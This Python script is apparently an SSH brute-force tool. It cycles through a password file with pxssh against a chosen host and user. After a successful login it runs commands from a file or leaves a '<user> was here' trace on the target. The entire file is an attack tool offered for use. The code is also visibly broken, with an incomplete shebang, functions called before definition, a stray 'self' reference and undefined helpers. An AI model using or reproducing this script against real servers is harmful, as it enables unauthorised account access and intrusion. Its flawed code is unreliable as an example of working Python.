#/usr/bin/env py3

import os
from pexpect import pxssh
import multiprocessing as mltp
from output_functions import output
from manage_options import user_options
from time import sleep


if __name__ in '__main__':
    printer = output()
    printer.hello()

    given_options = user_options(printer)
    given_options.check_options_validity()

    startHammering(given_options.host,
                   given_options.user,
                   given_options.passwd_file)






####################################
#                                  #
#         HAMMER JOB               #
#                                  #
####################################

def startHammering(host, user, passwd_file):
    done = mltp.Queue()
    done.put((0, False))

    f = open(passwd_file)

    serv = None
    done.put((1, serv))
    infos = []
    infos.append(host)
    infos.append(user)
    for passwd in f.readlines():
        passwd = passwd.replace('\n', '')
        if (len(infos) > 2):
            infos.pop()
        infos.append(passwd)
        mem = done.get()[1]
        if (mem == True):
            exit(0)
        else:
            done.put((0, mem))
        processes = [ mltp.Process(target=connectHost, \
                                  args=(infos, done,)) ]
        processes[0].start()
        sleep(0.8)

    for endProcess in processes:
        endProcess.join()


def connectHost(infos, done):
    try:
        serv = pxssh.pxssh()
        serv.login(infos[0], infos[1], infos[2])
        done.put((0, True))
        printSuccess(infos[2], infos[1])
        startSendCmd(serv)
    except:
        printConnectFail(infos[1], infos[2])


def startSendCmd(serv):
    global cmd_file

    if (self.cmd_file == None):
        sendCmd(serv, 'echo "' + os.getlogin() +
                ' was here" >> .trace')
    else:
        f = open(cmd_file)
        for l in f.readlines():
            sendCmd(serv, l.replace('\n', ''))


def sendCmd(serv, cmd):
    serv.sendline(cmd)
    serv.prompt()
    print(serv.before)


if __name__ in '__main__':
    main()
